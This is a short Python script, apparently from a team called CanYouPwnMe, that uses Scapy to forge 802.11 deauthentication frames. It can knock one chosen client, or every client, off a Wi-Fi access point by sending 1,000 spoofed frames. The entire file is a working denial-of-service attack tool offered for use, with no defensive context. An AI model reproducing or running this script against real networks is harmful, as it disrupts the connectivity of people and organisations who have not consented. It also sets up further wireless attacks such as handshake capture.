#!/usr/bin/env python

from scapy.all import *
import argparse

iface = 'wlan0'

helpme = """

Author : Besim ALTINOK ||| Team   : CanYouPwnMe

"""

parser = argparse.ArgumentParser(description=helpme)
parser.add_argument('-m', action='store', dest='mode',
                    help='Attack mode')
parser.add_argument('-a', action='store', dest='bssid',
                    help='Access point mac address')
parser.add_argument('-c', action='store', dest='client',
                    help='Client mac address')
parser.add_argument('-i', action='store', dest='iface',
                    help='Interface for attack\n')                                   
args = parser.parse_args()


client = args.client
bssid  = args.bssid
mode   = args.mode
iface  = args.iface
broad  = "ff:ff:ff:ff:ff:ff"

if mode == 'c':
	print "Send Deauth packet to : ", client, " - AP : ", bssid
	deauth = RadioTap() / Dot11(addr1=bssid, addr2=client.lower(), addr3=bssid)/Dot11Deauth()
	sendp(deauth, iface=iface, count=1000, inter = .2, verbose=False)
elif mode == 'b':
	print "Send Deauth packet to AP: ", bssid
	deauth = RadioTap() / Dot11(addr1=broad, addr2=bssid.lower(), addr3=bssid.lower())/Dot11Deauth()
	sendp(deauth, iface=iface, count=1000, inter = .2, verbose=False)
